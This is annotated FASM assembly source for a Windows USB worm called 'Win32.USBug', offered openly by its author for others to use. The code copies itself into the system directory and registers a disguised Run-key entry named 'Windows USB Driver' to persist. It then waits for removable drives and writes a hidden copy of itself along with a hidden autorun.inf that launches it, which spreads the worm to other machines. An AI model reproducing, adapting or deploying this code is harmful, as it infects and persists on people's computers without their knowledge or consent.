   ; Win32.USBug - A simple USB Worm
   ; by DiA/RRLF
   ; http://www.vx-dia.de.vu
   ; DiA_hates_machine@gmx.de
   ;
   ; Alot of comments, pretty much self explaining, have fun with this little fucker.


   include "%fasminc%\win32ax.inc"         ;common stuff

   section "usbug" code readable writeable executable ;just one section
       invoke GetModuleFileName,\      ;get our path
           0,\             ;this module
           OurPath,\           ;store it here
           256d                ;size of buffer

       invoke GetSystemDirectory,\     ;get system directory
           SystemDir,\         ;buffer
           256d                ;size of buffer

       mov eax, dword [OurPath + 5d]       ;get a dword of the string in eax (c:\wINDOws\system32\usbug.exe)
       mov ebx, dword [SystemDir + 5d]     ;get also a dword in ebx (c:\wINDOws\system32)

       cmp eax, ebx                ;check if same
       je GetWatchDrive            ;then skip installation

       xor ecx, ecx                ;clear counter

   GetPathEnd:                 ;get the end of the system path
       cmp byte [SystemDir + ecx], 0       ;check for terminating zero
       je HavePathEnd              ;if so we found end of string

       inc ecx                 ;inc counter
       jmp GetPathEnd              ;check next place

   HavePathEnd:                    ;append our installation name
       mov dword [SystemDir + ecx], "\usb" ;dword for dword
       mov dword [SystemDir + ecx + 4d], "ug.e";no need for api here
       mov word [SystemDir + ecx + 8d], "xe"   ;now we have full path
       add ecx, 10d                ;update counter
       push ecx                ;save counter to stack

       invoke CopyFile,\           ;copy to system directory
           OurPath,\           ;from here
           SystemDir,\         ;to system directory (contains full path)
           0               ;overwrite if we are already there

       pop ecx                 ;get counter from stack
       mov ebx, ecx                ;save counter for registry use in ebx
       mov byte [OurPath + ecx], 0     ;set terminating zero to string, ecx is zero after copying bytes
       mov esi, SystemDir          ;source index is system dir buffer, counter is in ecx
       mov edi, OurPath            ;destination is our path buffer
       rep movsb               ;move ecx bytes from esi to edi

       invoke RegOpenKeyEx,\           ;open registry key
           HKEY_LOCAL_MACHINE,\        ;write in this key
           RegRunKey,\         ;write to this autostart subkey
           0,\             ;reserved
           KEY_SET_VALUE,\         ;we wanna write a value
           RegHandle           ;save handle here

       invoke RegSetValueEx,\          ;set our value
           dword [RegHandle],\     ;reg handle
           RegValueName,\          ;the value name, some fake of course
           0,\             ;reserved
           REG_SZ,\            ;its a zero terminated string
           OurPath,\           ;full path
           ebx             ;size of buffer (ex-counter)

       invoke RegCloseKey,\            ;close registry
           dword [RegHandle]       ;via handle

   GetWatchDrive:                  ;get next free drive letter
       invoke GetLogicalDriveStrings,\     ;call API to get all drives as strings in AllDrives
           105d,\              ;size of buffer (A:\0 = 4 bytes * 26 + terminating 0)
           AllDrives           ;store it here

       mov bl, 67d             ;store "C" in bl, thats where we start
       xor ecx, ecx                ;clear counter

       cmp byte [AllDrives], 65d       ;check if we start at A:\
       jne FindWatchDrive          ;if not start checking

       add ecx, 4d             ;if there is a A:\ skip it

       cmp byte [AllDrives + ecx], 66d     ;is there also a B:\
       jne FindWatchDrive          ;no, we are at C:\, start checking

       add ecx, 4d             ;if there is a B:\ skip this, we are now at C:\

   FindWatchDrive:                 ;find the drive where usb sticks can be plugged
       cmp word [AllDrives + ecx], 00d     ;we are at string end? then usb drive is last available + 1
       je FoundEnd             ;we are at the end

       cmp byte [AllDrives + ecx], bl      ;is there a clean chain like C D E F G ...
       jne FoundWatchDrive         ;no? then we found the usb drive in the middle

       inc bl                  ;check next character
       add ecx, 4d             ;skip C:\0 for example
       jmp FindWatchDrive          ;and check next string

   FoundWatchDrive:                ;usb drive is in the middle
       mov bl, byte [AllDrives + ecx]      ;get drive AFTER the space
       dec bl                  ;dec it, so we have the usb drive
       mov byte [WatchDrive], bl       ;store it
       jmp WaitForUsb              ;skip

   FoundEnd:                   ;lets get last drive from end of string
       sub ecx, 4d             ;set counter to last available drive
       mov bl, byte [AllDrives + ecx]      ;get last available drive letter
       inc bl                  ;inc it, so we have the usb drive
       mov byte [WatchDrive], bl       ;store it

   WaitForUsb:                 ;now lets wait until a usb stick is plugged
       mov dword [UsbFile], "driv"     ;set filename dword by dword
       mov dword [UsbFile + 4d], "er.e"    ;no api here too
       mov word [UsbFile + 8d], "xe"       ;now we have a full path in WatchDrive
       mov byte [UsbFile + 10d], 0     ;terminating null

   DropToUsb:                  ;try to copy ourself on the drive + filename
       invoke CopyFile,\           ;copy file
           OurPath,\           ;from system directory
           WatchDrive,\            ;to the possible usb stick (O:\driver.exe as example)
           0               ;overwrite if already exist

       cmp eax, 0              ;failure?
       jne GenerateAutorun         ;if not a usb is plugged and we can generate the autostart.inf

       invoke Sleep,\              ;nothing plugged, sleep for 20 seconds
           20000d              ;20sec

       jmp DropToUsb               ;loop it

   GenerateAutorun:                ;drive available! usb plugged...
       invoke SetFileAttributes,\      ;hide our program
           WatchDrive,\            ;full path of it
           FILE_ATTRIBUTE_HIDDEN       ;hidden

       mov dword [UsbFile], "auto"     ;overwrite our copy path (driver.exe) with "autorun.inf"
       mov dword [UsbFile + 4d], "run."    ;dword for dword
       mov dword [UsbFile + 8d], "inf"     ;no lstrcat dude!

       invoke CreateFile,\         ;now create the autorun.inf
           WatchDrive,\            ;full path to usb (O:\autorun.inf) for example
           GENERIC_WRITE,\         ;just write to it
           0,\             ;no shared mode
           0,\             ;no security attributes
           CREATE_ALWAYS,\         ;overwrite if exist
           FILE_ATTRIBUTE_HIDDEN,\     ;create it hidden
           0               ;no template file

       mov ebx, eax                ;save file handle in ebx

       mov dword [SystemDir], "[aut"       ;prepare the buffer, use already but not used buffer
       mov dword [SystemDir + 4d], "orun"  ;dword for dword
       mov dword [SystemDir + 8d], "]"     ;finished first line
       mov byte [SystemDir + 9d], 13d      ;linebreak
       mov byte [SystemDir + 10d], 10d     ;13, 10
       mov dword [SystemDir + 11d], "open" ;open our program on connect
       mov dword [SystemDir + 15d], "=dri" ;driver.exe
       mov dword [SystemDir + 19d], "ver." ;lstrcat my ass
       mov dword [SystemDir + 23d], "exe"  ;"exe" + terminating zero

       invoke WriteFile,\          ;write buffer to file
           ebx,\               ;file handle
           SystemDir,\         ;the buffer with the autostart.inf content
           26d,\               ;number of bytes to write
           RegHandle,\         ;put number of written bytes to nowhere
           0               ;no overlapped

       invoke CloseHandle,\            ;close file
           ebx             ;via handle

       ret                 ;ExitProcess for poor people

   Datas:                      ;here are the needed datas
       Copyleft    db "USBug - DiA/RRLF"   ;bow!
       OurPath     rb 256d         ;here we store the path of this program
       SystemDir   rb 256d         ;buffer for system directory
       RegRunKey   db "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0 ;reg autostart
       RegHandle   dd ?            ;store reg handle here
       RegValueName    db "Windows USB Driver", 0;fake value name for registry
       AllDrives   rb 105d         ;all available drives: C:\0D:\0E:\00
       WatchDrive  db "_:\"        ;here we store the drive where a usb stick can be plugged
       UsbFile     db 14d          ;buffer for "driver.exe" and "autostart.inf" + terminating zero

   section "usb!" import data readable writeable ;our import table :)
       library kernel,         "kernel32.dll",\
           advapi,         "advapi32.dll"

       import kernel,\
           GetModuleFileName,  "GetModuleFileNameA",\
           CopyFile,       "CopyFileA",\
           GetLogicalDriveStrings, "GetLogicalDriveStringsA",\
           Sleep,          "Sleep",\
           SetFileAttributes,  "SetFileAttributesA",\
           CreateFile,     "CreateFileA",\
           WriteFile,      "WriteFile",\
           CloseHandle,        "CloseHandle",\
           GetSystemDirectory, "GetSystemDirectoryA"

       import advapi,\
           RegOpenKeyEx,       "RegOpenKeyExA",\
           RegSetValueEx,      "RegSetValueExA",\
           RegCloseKey,        "RegCloseKey"
